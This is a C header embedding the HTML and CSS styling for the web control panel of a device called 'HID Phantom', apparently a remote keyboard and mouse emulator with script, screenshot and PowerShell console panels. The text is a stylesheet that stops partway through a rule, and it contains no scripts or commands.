#ifndef WEBPAGE_H
#define WEBPAGE_H

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>HID Phantom</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            height: 100vh;
            height: 100dvh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            padding-bottom: env(safe-area-inset-bottom);
        }

        /* ========== HEADER ========== */
        #header {
            background: linear-gradient(135deg, #0f1729 0%, #1a2332 100%);
            padding: 12px 20px;
            padding-top: max(12px, env(safe-area-inset-top));
            border-bottom: 2px solid #1e88e5;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.5);
        }

        #header h1 {
            font-size: 18px;
            font-weight: 600;
            color: #42a5f5;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        #header-controls {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        #status {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #90caf9;
        }

        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ef5350;
            box-shadow: 0 0 8px rgba(239,83,80,0.5);
            animation: pulse 2s infinite;
        }

        .status-indicator.connected {
            background: #66bb6a;
            box-shadow: 0 0 8px rgba(102,187,106,0.5);
            animation: none;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }


        .header-icon-btn {
            background: rgba(30, 136, 229, 0.2);
            border: 1px solid #1e88e5;
            border-radius: 4px;
            padding: 6px 8px;
            color: #64b5f6;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            min-width: 32px;
            height: 32px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }

        .header-icon-btn:hover {
            background: rgba(30, 136, 229, 0.4);
            box-shadow: 0 2px 6px rgba(30,136,229,0.4);
            transform: translateY(-1px);
        }

        .header-icon-btn:active {
            transform: translateY(0);
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .header-icon-btn.active {
            background: rgba(30, 136, 229, 0.2);
            border-color: #546e7a;
            color:rgb(62, 80, 88);
        }

        .control-btn {
            padding: 6px 10px;
            background: rgba(44, 62, 80, 0.8);
            color: #e0e0e0;
            border: 1px solid #546e7a;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.2s ease;
            white-space: nowrap;
        }

        .control-btn:hover {
            background: rgba(52, 73, 94, 0.9);
            border-color: #78909c;
            transform: translateY(-1px);
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        .control-btn:active {
            transform: translateY(0);
            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }

        .btn-on {
            border-color: #4caf50 !important;
            background: rgba(76, 175, 80, 0.15) !important;
        }

        .btn-on:hover {
            background: rgba(76, 175, 80, 0.25) !important;
            border-color: #66bb6a !important;
        }

        .btn-off {
            border-color: #f44336 !important;
            background: rgba(244, 67, 54, 0.15) !important;
        }

        .btn-off:hover {
            background: rgba(244, 67, 54, 0.25) !important;
            border-color: #ef5350 !important;
        }

        .btn-separator {
            width: 1px;
            height: 24px;
            margin: 0 8px;
        }

        /* ========== TOGGLE SWITCHES ========== */
        .toggle-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .toggle-label {
            font-size: 12px;
            color: #e0e0e0;
            font-weight: 500;
            white-space: nowrap;
            user-select: none;
        }

        .toggle-switch {
            position: relative;
            width: 44px;
            height: 22px;
            background: rgba(69, 69, 69, 0.8);
            border-radius: 15px;
            border: 1px solid #546e7a;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .toggle-switch:hover {
            border-color: #78909c;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        .toggle-switch.active {
            background: rgba(76, 175, 80, 0.3);
            border-color: #4caf50;
        }

        .toggle-switch.active:hover {
            background: rgba(76, 175, 80, 0.4);
            border-color: #66bb6a;
        }

        .toggle-slider {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 16px;
            height: 16px;
            background: #ffffff;
            border-radius: 50%;
            transition: all 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }

        .toggle-switch.active .toggle-slider {
            transform: translateX(22px);
            background: #e8f5e9;
        }

        .toggle-switch.disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .toggle-switch.disabled:hover {
            border-color: #546e7a;
            box-shadow: none;
        }

        /* ========== OUTPUT TERMINAL ========== */
        #terminal-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 12px;
            padding-left: max(12px, env(safe-area-inset-left));
            padding-right: max(12px, env(safe-area-inset-right));
            overflow: hidden;
            min-height: 0;
            background: #0a0e27;
            position: relative;
        }

        #output {
            flex: 1;
            background: #000000;
            border: 1px solid #1e3a5f;
            border-radius: 4px;
            padding: 12px;
            overflow-y: auto;
            overflow-x: auto;
            font-family: 'Courier New', 'Consolas', monospace;
            font-size: 13px;
            line-height: 1.5;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #90caf9;
            min-height: 0;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
        }

        .scroll-btn {
            position: absolute;
            right: 1px;
            width: 18px;
            height: 18px;
            background: rgba(30, 58, 95, 0.9);
            border: 1px solid #1e3a5f;
            border-radius: 2px;
            color: #64b5f6;
            font-size: 10px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            transition: all 0.2s ease;
            box-shadow: 0 1px 3px rgba(0,0,0,0.5);
        }

        .scroll-btn:hover {
            background: rgba(30, 136, 229, 0.9);
            color: #e3f2fd;
            box-shadow: 0 2px 4px rgba(30,136,229,0.6);
        }

        .scroll-btn:active {
            transform: scale(0.9);
        }

        #scroll-up-btn {
            top: 1px;
        }

        #scroll-down-btn {
            bottom: 1px;
        }

        #output::-webkit-scrollbar {
            width: 8px;
        }

        #output::-webkit-scrollbar-track {
            background: #0a0e27;
        }

        #output::-webkit-scrollbar-thumb {
            background: #1e3a5f;
            border-radius: 4px;
        }

        #output::-webkit-scrollbar-thumb:hover {
            background: #2e4a6f;
        }

        /* Event type colors */
        .hid-keyboard { color: #64b5f6; }
        .hid-mouse { color: #81c784; }
        .hid-media { color: #ba68c8; }
        .hid-system { color: #ffb74d; }
        .at-response { color: #4fc3f7; background: rgba(79,195,247,0.1); padding: 2px 4px; border-radius: 2px; }
        .system-message { color: #66bb6a; font-style: italic; }
        .error-message { color: #ef5350; }
        .success-message { color: #66bb6a; }

        /* ========== CONTROL PANEL ========== */
        #control-panel {
            background: linear-gradient(135deg, #0f1729 0%, #1a2332 100%);
            border-top: 2px solid #1e3a5f;
            padding: 8px 10px 10px 10px;
            padding-left: max(10px, env(safe-area-inset-left));
            padding-right: max(10px, env(safe-area-inset-right));
            padding-bottom: max(12px, calc(12px + env(safe-area-inset-bottom)));
            flex-shrink: 0;
            box-shadow: 0 -2px 8px rgba(0,0,0,0.5);
            max-height: 31vh;
            overflow-y: auto;
        }

        .footer-text {
            text-align: center;
            color: #546e7a;
            font-size: 11px;
            margin-top: 3px;
            padding-top: 3px;
            border-top: 1px solid #1e3a5f;
        }

        .button-group {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(70px, 1fr));
            gap: 6px;
            margin-bottom: 6px;
        }

        .button-group:last-child {
            margin-bottom: 0;
        }

        /* ========== BUTTONS ========== */
        button {
            background: linear-gradient(135deg, #1565c0 0%, #0d47a1 100%);
            border: 1px solid #1976d2;
            border-radius: 4px;
            padding: 8px 12px;
            color: #e3f2fd;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 4px;
            min-width: 70px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }

        button:hover:not(:disabled) {
            background: linear-gradient(135deg, #1976d2 0%, #1565c0 100%);
            box-shadow: 0 2px 6px rgba(30,136,229,0.4);
            transform: translateY(-1px);
        }

        button:active:not(:disabled) {
            transform: translateY(0);
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        button:disabled {
            background: #1a2332;
            color: #546e7a;
            cursor: not-allowed;
            border-color: #263238;
            box-shadow: none;
        }

        .btn-record {
            background: linear-gradient(135deg, #c62828 0%, #b71c1c 100%);
            border-color: #d32f2f;
        }

        .btn-record:hover:not(:disabled) {
            background: linear-gradient(135deg, #d32f2f 0%, #c62828 100%);
            box-shadow: 0 2px 6px rgba(211,47,47,0.4);
        }

        .btn-record.recording {
            background: linear-gradient(135deg, #ef6c00 0%, #e65100 100%);
            border-color: #f57c00;
            animation: recordBlink 1s infinite;
        }

        @keyframes recordBlink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        .btn-warning {
            background: linear-gradient(135deg, #f57c00 0%, #e65100 100%);
            border-color: #ff9800;
        }

        .btn-warning:hover:not(:disabled) {
            background: linear-gradient(135deg, #fb8c00 0%, #f57c00 100%);
            box-shadow: 0 2px 6px rgba(255,152,0,0.4);
        }

        .btn-success {
            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%);
            border-color: #4caf50;
        }

        .btn-success:hover:not(:disabled) {
            background: linear-gradient(135deg, #43a047 0%, #388e3c 100%);
            box-shadow: 0 2px 6px rgba(76,175,80,0.4);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #37474f 0%, #263238 100%);
            border-color: #455a64;
        }

        .btn-secondary:hover:not(:disabled) {
            background: linear-gradient(135deg, #455a64 0%, #37474f 100%);
            box-shadow: 0 2px 6px rgba(69,90,100,0.4);
        }

        .btn-hybrid-active {
            background: linear-gradient(135deg, #f57c00 0%, #e65100 100%) !important;
            border-color: #ff9800 !important;
        }

        .btn-hybrid-active:hover:not(:disabled) {
            background: linear-gradient(135deg, #fb8c00 0%, #f57c00 100%) !important;
            box-shadow: 0 2px 6px rgba(255,152,0,0.4) !important;
        }


        .script-indicator {
            width: 6px;
            height: 6px;
            border-radius: 50%;
            background: #546e7a;
        }

        .script-indicator.running {
            background: #4caf50;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* ========== TOAST NOTIFICATIONS ========== */
        #toast-container {
            position: fixed;
            top: 60px;
            right: 12px;
            z-index: 1000;
            display: flex;
            flex-direction: column;
            gap: 8px;
            max-width: 280px;
        }

        .toast {
            background: #1a2332;
            border-left: 3px solid #1e88e5;
            border-radius: 4px;
            padding: 10px 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.6);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                transform: translateX(300px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .toast.success { border-left-color: #66bb6a; }
        .toast.error { border-left-color: #ef5350; }
        .toast.warning { border-left-color: #ffa726; }
        .toast.info { border-left-color: #42a5f5; }

        /* ========== MODAL BASE ========== */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        .modal-content {
            background: #1a2332;
            border: 2px solid #1e3a5f;
            border-radius: 6px;
            padding: 20px;
            max-width: 400px;
            width: 90%;
            max-height: 85vh;
            overflow-y: auto;
            box-shadow: 0 8px 24px rgba(0,0,0,0.8);
            animation: modalPop 0.3s ease;
        }

        .modal-content::-webkit-scrollbar {
            width: 8px;
        }

        .modal-content::-webkit-scrollbar-track {
            background: #0a0e27;
            border-radius: 4px;
        }

        .modal-content::-webkit-scrollbar-thumb {
            background: #1e3a5f;
            border-radius: 4px;
        }

        .modal-content::-webkit-scrollbar-thumb:hover {
            background: #2e4a6f;
        }

        @keyframes modalPop {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        .modal-header {
            font-size: 18px;
            font-weight: 600;
            color: #42a5f5;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-bottom: 1px solid #1e3a5f;
            padding-bottom: 10px;
        }

        .modal-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #263238;
            font-size: 13px;
        }

        .modal-row:last-child {
            border-bottom: none;
        }

        .modal-label {
            color: #78909c;
            font-weight: 500;
        }

        .modal-value {
            color: #90caf9;
            font-family: 'Courier New', monospace;
        }

        /* ========== SETTINGS MODAL ========== */
        .settings-section {
            background: rgba(10, 14, 39, 0.5);
            border: 1px solid #1e3a5f;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .settings-section:last-of-type {
            margin-bottom: 0;
        }

        .settings-section-header {
            font-size: 16px;
            font-weight: 600;
            color: #42a5f5;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid #1e3a5f;
        }

        .file-upload-area {
            border: 2px dashed #1e88e5;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            background: rgba(30, 136, 229, 0.05);
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 16px;
        }

        .file-upload-area:hover {
            background: rgba(30, 136, 229, 0.1);
            border-color: #42a5f5;
        }

        .file-upload-area.dragover {
            background: rgba(30, 136, 229, 0.2);
            border-color: #64b5f6;
        }

        #file-input {
            display: none;
        }

        .file-info {
            margin-top: 12px;
            font-size: 13px;
            color: #90caf9;
        }

        .progress-container {
            width: 100%;
            height: 30px;
            background: #0a0e27;
            border: 1px solid #1e3a5f;
            border-radius: 4px;
            overflow: hidden;
            margin: 16px 0;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #1e88e5 0%, #42a5f5 100%);
            width: 0%;
            transition: width 0.2s linear;
            position: relative;
        }

        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 1.5s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .progress-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 14px;
            font-weight: 600;
            color: #e3f2fd;
            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
            z-index: 1;
        }

        .ota-warning {
            background: rgba(255, 152, 0, 0.1);
            border-left: 3px solid #ff9800;
            padding: 12px;
            border-radius: 4px;
            font-size: 13px;
            color: #ffb74d;
            margin-bottom: 16px;
        }

        .upload-stats {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #78909c;
            margin-top: 8px;
        }

        /* ========== INPUT MODAL ========== */
        #input-modal-content {
            max-width: 500px;
            width: 95%;
        }

        #trackpad-container {
            display: none;
        }

        #trackpad-container.active {
            display: block;
        }

        #trackpad-wrapper {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
        }

        #trackpad {
            flex: 1;
            height: 300px;
            background: #0a0e27;
            border: 2px solid #1e88e5;
            border-radius: 8px;
            cursor: crosshair;
            touch-action: none;
            position: relative;
        }

        #trackpad::after {
            content: 'Draw here to move mouse';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #546e7a;
            font-size: 14px;
            pointer-events: none;
        }

        #scroll-area {
            width: 50px;
            height: 300px;
            background: #0a0e27;
            border: 2px solid #ba68c8;
            border-radius: 8px;
            cursor: ns-resize;
            touch-action: none;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .scroll-arrow-btn {
            position: absolute;
            width: 46px;
            height: 32px;
            background: linear-gradient(135deg, rgba(186, 104, 200, 0.4) 0%, rgba(156, 39, 176, 0.4) 100%);
            border: 1px solid #ba68c8;
            border-radius: 4px;
            color: #e1bee7;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            z-index: 10;
            user-select: none;
            -webkit-user-select: none;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        .scroll-arrow-btn:hover {
            background: linear-gradient(135deg, rgba(186, 104, 200, 0.7) 0%, rgba(156, 39, 176, 0.7) 100%);
            box-shadow: 0 2px 6px rgba(186,104,200,0.5);
            transform: translateY(-1px);
        }

        .scroll-arrow-btn:active {
            transform: translateY(0) scale(0.95);
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        #scroll-up-arrow {
            top: 4px;
        }

        #scroll-down-arrow {
            bottom: 4px;
        }

        .scroll-indicator {
            position: absolute;
            width: 30px;
            height: 30px;
            background: rgba(186, 104, 200, 0.3);
            border: 2px solid #ba68c8;
            border-radius: 50%;
            pointer-events: none;
            transition: all 0.1s ease;
        }

        #mouse-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }

        .mouse-btn {
            flex: 1;
            padding: 15px;
            font-size: 14px;
            font-weight: 600;
        }

        /* ========== KEYBOARD INPUT ========== */
        #keyboard-container {
            display: none;
        }

        #keyboard-container.active {
            display: block;
        }

        #keyboard-display {
            width: 100%;
            height: 300px;
            background: #000000;
            border: 2px solid #1e88e5;
            border-radius: 8px;
            padding: 12px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #90caf9;
            margin-bottom: 12px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        #keyboard-input-field {
            width: 100%;
            padding: 10px;
            background: #0a0e27;
            border: 2px solid #1e3a5f;
            border-radius: 4px;
            color: #e0e0e0;
            font-size: 14px;
            margin-bottom: 12px;
            font-family: 'Courier New', monospace;
        }

        #keyboard-input-field:focus {
            outline: none;
            border-color: #1e88e5;
        }

        .keyboard-hint {
            font-size: 12px;
            color: #78909c;
            text-align: center;
            margin-bottom: 12px;
        }

        /* ========== SECTION LABELS ========== */
        .section-label {
            font-size: 10px;
            color: #546e7a;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
            font-weight: 600;
        }

        /* ========== TOGGLE SWITCH ========== */
        .toggle-switch-container {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 6px 10px;
            background: rgba(0,0,0,0.3);
            border: 1px solid #1e3a5f;
            border-radius: 20px;
            min-width: 100px;
            justify-content: center;
        }

        .toggle-switch-label {
            font-size: 11px;
            color: #90caf9;
            font-weight: 500;
        }

        .toggle-switch {
            position: relative;
            width: 44px;
            height: 24px;
            background: #37474f;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.3s ease;
            border: 1px solid #455a64;
        }

        .toggle-switch.disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .toggle-switch.active {
            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%);
            border-color: #4caf50;
        }

        .toggle-switch-circle {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 18px;
            height: 18px;
            background: #e0e0e0;
            border-radius: 50%;
            transition: transform 0.3s ease;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        .toggle-switch.active .toggle-switch-circle {
            transform: translateX(20px);
            background: #ffffff;
        }

        /* ========== MOBILE RESPONSIVE ========== */
        @media (max-width: 768px) {
            #header {
                flex-wrap: wrap;
            }

            #header {
                flex-direction: column;
                align-items: stretch;
                gap: 8px;
            }

            #header h1 {
                font-size: 16px;
            }

            #header > div:first-child {
                justify-content: center;
                gap: 8px !important;
            }

            #header-controls {
                gap: 6px;
                flex-wrap: wrap;
                justify-content: center;
            }

            #memory-stats {
                font-size: 10px;
                padding: 3px 6px;
            }

            .header-icon-btn {
                min-width: 28px;
                height: 28px;
                padding: 5px 6px;
                font-size: 12px;
            }

            #status {
                font-size: 11px;
            }

            #output {
                font-size: 12px;
                padding: 10px;
            }

            button {
                font-size: 11px;
                padding: 8px 10px;
                min-width: 60px;
            }

            #control-panel {
                padding: 8px 10px 20px 10px;
                padding-left: max(10px, env(safe-area-inset-left));
                padding-right: max(10px, env(safe-area-inset-right));
                padding-bottom: max(20px, calc(20px + env(safe-area-inset-bottom)));
            }

            .button-group {
                grid-template-columns: repeat(auto-fit, minmax(60px, 1fr));
                gap: 5px;
            }

            #trackpad {
                height: 250px;
            }

            #scroll-area {
                height: 250px;
                width: 45px;
            }

            .scroll-arrow-btn {
                width: 41px;
                height: 28px;
                font-size: 14px;
            }

            .scroll-btn {
                width: 16px;
                height: 16px;
                font-size: 9px;
            }
        }

        @media (max-width: 480px) {
            #header {
                padding: 10px 12px;
                padding-top: max(10px, env(safe-area-inset-top));
            }

            #header h1 {
                font-size: 14px;
            }

            button {
                font-size: 10px;
                padding: 7px 8px;
                min-width: 55px;
            }

            .button-group {
                grid-template-columns: repeat(auto-fit, minmax(55px, 1fr));
            }

            #trackpad {
                height: 200px;
            }

            #scroll-area {
                height: 200px;
                width: 40px;
            }

            .scroll-arrow-btn {
                width: 36px;
                height: 26px;
                font-size: 14px;
            }

            .scroll-btn {
                width: 14px;
                height: 14px;
                font-size: 8px;
            }

            /* Settings modal responsive */
            .modal-content {
                width: 95%;
                padding: 16px;
                max-height: 90vh;
            }

            .settings-section {
                padding: 12px;
                margin-bottom: 12px;
            }

            .settings-section-header {
                font-size: 14px;
            }

            .ota-warning {
                font-size: 12px;
                padding: 10px;
            }

            .modal-header {
                font-size: 16px;
            }

            .file-upload-area {
                padding: 20px;
            }

            input[type="text"], input[type="password"] {
                font-size: 13px !important;
                padding: 8px !important;
            }
        }

        /* ========== VIRTUAL KEYBOARD ========== */
        #vkeyboard-modal-overlay {
            background: rgba(0,0,0,0.95);
        }

        #vkeyboard-modal-overlay .modal-content {
            max-width: 95vw;
            width: 100%;
            max-height: 95vh;
            padding: 12px;
            background: #0a0e27;
        }

        #vkeyboard-container {
            display: flex;
            flex-direction: column;
            gap: 6px;
            width: 100%;
        }

        .vkey-row {
            display: grid;
            grid-template-columns: repeat(76, 1fr);
            gap: 3px;
            margin-bottom: 3px;
        }

        .vkey {
            background: linear-gradient(135deg, #1a2332 0%, #0f1729 100%);
            border: 1px solid #1e3a5f;
            border-radius: 4px;
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 10px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.05s ease;
            user-select: none;
            -webkit-user-select: none;
            -webkit-tap-highlight-color: transparent;
            touch-action: manipulation;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 4px 2px;
            min-height: 40px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
            grid-column: span 4;
        }

        .vkey:active, .vkey.pressed {
            background: linear-gradient(135deg, #1e88e5 0%, #1565c0 100%);
            border-color: #42a5f5;
            transform: translateY(1px);
            box-shadow: 0 1px 2px rgba(0,0,0,0.3), inset 0 1px 3px rgba(0,0,0,0.3);
        }

        .vkey.modifier {
            background: linear-gradient(135deg, #2e4a6f 0%, #1e3a5f 100%);
        }

        .vkey.modifier.active {
            background: linear-gradient(135deg, #f57c00 0%, #e65100 100%);
            border-color: #ff9800;
            box-shadow: 0 0 8px rgba(255,152,0,0.5);
        }

        .vkey.toggle.active {
            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%);
            border-color: #4caf50;
            box-shadow: 0 0 8px rgba(76,175,80,0.5);
        }

        /* Key widths - 76 column grid, standard key = 4 columns (1u) */
        .vkey.w-1_25 { grid-column: span 5; }
        .vkey.w-1_5 { grid-column: span 6; }
        .vkey.w-1_75 { grid-column: span 7; }
        .vkey.w-2 { grid-column: span 8; }
        .vkey.w-2_15 { grid-column: span 9; }
        .vkey.w-2_25 { grid-column: span 10; }
        .vkey.w-2_5 { grid-column: span 10; }
        .vkey.w-2_75 { grid-column: span 11; }
        .vkey.spacebar { grid-column: span 30; }

        /* Tall keys that span 2 rows */
        .vkey.w-tall-2row {
            grid-column: span 4;
            grid-row: span 2;
        }

        #vkeyboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            padding: 8px;
            background: #1a2332;
            border-radius: 4px;
        }

        #vkeyboard-title {
            font-size: 14px;
            font-weight: 600;
            color: #42a5f5;
        }

        #vkeyboard-close {
            background: linear-gradient(135deg, #c62828 0%, #b71c1c 100%);
            border: 1px solid #d32f2f;
            border-radius: 4px;
            padding: 4px 8px;
            color: #e3f2fd;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            line-height: 1;
            width: 28px;
            height: 28px;
            min-width: 28px;
            max-width: 28px;
            flex-shrink: 0;
            flex-grow: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #vkeyboard-close:hover {
            background: linear-gradient(135deg, #d32f2f 0%, #c62828 100%);
            box-shadow: 0 2px 6px rgba(211,47,47,0.4);
        }

        #vkeyboard-status {
            font-size: 10px;
            color: #78909c;
            text-align: center;
            padding: 4px;
        }

        /* Mobile landscape optimization */
        @media (max-height: 500px) and (orientation: landscape) {
            #vkeyboard-modal-overlay .modal-content {
                padding: 4px;
            }

            #vkeyboard-container {
                gap: 3px;
            }

            .vkey {
                min-height: 30px;
                font-size: 10px;
            }

            .vkey-row {
                gap: 3px;
                margin-bottom: 3px;
            }

            #vkeyboard-header {
                padding: 4px;
                margin-bottom: 4px;
            }
        }

        /* Tablet/Desktop - larger keys */
        @media (min-width: 768px) and (min-height: 600px) {
            .vkey {
                min-height: 44px;
                font-size: 13px;
                padding: 4px 6px;
            }

            #vkeyboard-container {
                gap: 6px;
            }

            .vkey-row {
                gap: 5px;
            }
        }

        /* ========== SCRIPT SELECTOR MODAL ========== */
        .script-selector-modal .modal-content {
            max-width: 400px;
            width: 90%;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
        }

        .script-selector-modal .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }

        .modal-close-btn {
            background: transparent;
            border: none;
            color: #78909c;
            font-size: 24px;
            padding: 0;
            width: 32px;
            height: 32px;
            cursor: pointer;
            transition: all 0.2s;
            line-height: 1;
        }

        .modal-close-btn:hover {
            color: #e3f2fd;
            background: rgba(30, 58, 95, 0.5);
            border-radius: 4px;
        }

        /* Hidden file input for script upload */
        #script-upload-input {
            display: none;
        }

        .btn-warning {
            background: linear-gradient(135deg, #ff9800 0%, #f57c00 100%);
            border: 2px solid #ef6c00;
        }

        .btn-warning:hover:not(:disabled) {
            background: linear-gradient(135deg, #ffa726 0%, #ff9800 100%);
        }

        /* ========== SCREENSHOT VIEWER MODAL ========== */
        #screenshot-modal-content {
            max-width: 95vw;
            width: 95vw;
            height: 85vh;
            max-height: 85vh;
            display: flex;
            flex-direction: column;
            background: #0a0e27;
            border: 1px solid #1e3a5f;
            border-radius: 4px;
            overflow: hidden;
            padding: 0;
        }

        /* ========== POWERSHELL CONSOLE MODAL ========== */
        #serial-monitor-content {
            max-width: 900px;
            width: 90vw;
            height: 85vh;
            max-height: 85vh;
            display: flex;
            flex-direction: column;
            background: #012456;
            border: 1px solid #003578;
            border-radius: 4px;
            overflow: hidden;
            padding: 0;
        }

        .ps-header {
            background: #1e1e1e;
            border-bottom: 1px solid #2d2d2d;
            padding: 10px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }

        .ps-header-title {
            font-size: 13px;
            color: #cccccc;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .ps-status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ef5350;
            transition: background 0.3s, box-shadow 0.3s;
            box-shadow: 0 0 4px rgba(239, 83, 80, 0.6);
        }

        .ps-status-indicator.connected {
            background: #66bb6a;
            box-shadow: 0 0 4px rgba(102, 187, 106, 0.6);
        }

        .ps-status-indicator.executing {
            background: #ff9800;
            box-shadow: 0 0 4px rgba(255, 152, 0, 0.6);
        }

        .ps-header-buttons {
            display: flex;
            gap: 8px;
        }

        .ps-header-btn {
            padding: 4px 12px;
            font-size: 11px;
            background: #3c3c3c;
            color: #cccccc;
            border: 1px solid #555555;
            cursor: pointer;
            font-family: inherit;
            transition: background 0.2s;
        }

        .ps-header-btn:hover {
            background: #505050;
        }

        .ps-header-btn.start {
            background: #1b4d1b;
            border-color: #2d6d2d;
            color: #90ee90;
        }

        .ps-header-btn.start:hover {
            background: #2d6d2d;
        }

        .ps-header-btn.exit {
            background: #3a1515;
            border-color: #5a1515;
        }

        .ps-header-btn.exit:hover {
            background: #5a1515;
        }

        .ps-header-btn:disabled {
            background: #2a2a2a;
            color: #666666;
            border-color: #3a3a3a;
            cursor: not-allowed;
        }

        .ps-header-btn:disabled:hover {
            background: #2a2a2a;
        }

        .ps-console-container {
            flex: 1;
            background: #012456;
            overflow-y: auto;
            padding: 15px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.4;
            color: #ffffff;
        }

        .ps-console-output {
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .ps-console-container::-webkit-scrollbar {
            width: 12px;
        }

        .ps-console-container::-webkit-scrollbar-track {
            background: #001a3d;
        }

        .ps-console-container::-webkit-scrollbar-thumb {
            background: #003578;
            border-radius: 6px;
        }

        .ps-console-container::-webkit-scrollbar-thumb:hover {
            background: #0055aa;
        }

        .ps-input-container {
            background: #012456;
            border-top: 1px solid #003578;
